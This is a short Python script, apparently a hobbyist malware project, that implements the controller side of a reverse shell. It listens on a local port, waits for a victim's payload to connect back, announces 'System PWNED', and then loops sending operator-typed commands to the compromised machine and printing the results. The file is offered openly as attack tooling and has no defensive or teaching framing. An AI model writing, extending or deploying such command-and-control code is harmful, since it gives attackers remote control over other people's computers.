import socket
import colorama

from colorama import init, Fore, Back, Style
#=====================================================================================================================================================
#                                                                      SIMPLE LISTENER
#
#                                                                     MADE MY MALWARE MIX
# THIS PROGRAM WILL MAKE A LISTENER AND A CLIENT SIDE ASWELL THE PAYLOAD OR "CLIENT SIDE" THAT WILL BE EXECUTING THE PROGRAM WILL CONNECT BACK TO YOU!

HOST = '127.0.0.1'
PORT = 8081
server = socket.socket()
server.bind((HOST, PORT))
print(Style.BRIGHT + Fore.GREEN + '[+] Server Started')
print(Style.BRIGHT + Fore.GREEN + '[+] Listening For Client Connection ...')
server.listen(1)
client, client_addr = server.accept()
print(f'[+] {client_addr}')
print(Style.BRIGHT + Fore.RED + '[+] System PWNED ;3')

while True:
    command = input(Style.BRIGHT + Fore.RED + 'PWNED@loser~#')
    command = command.encode()
    client.send(command)
    print('[+] Command sent')
    output = client.recv(1024)
    output = output.decode()
    print(f"Output: {output}")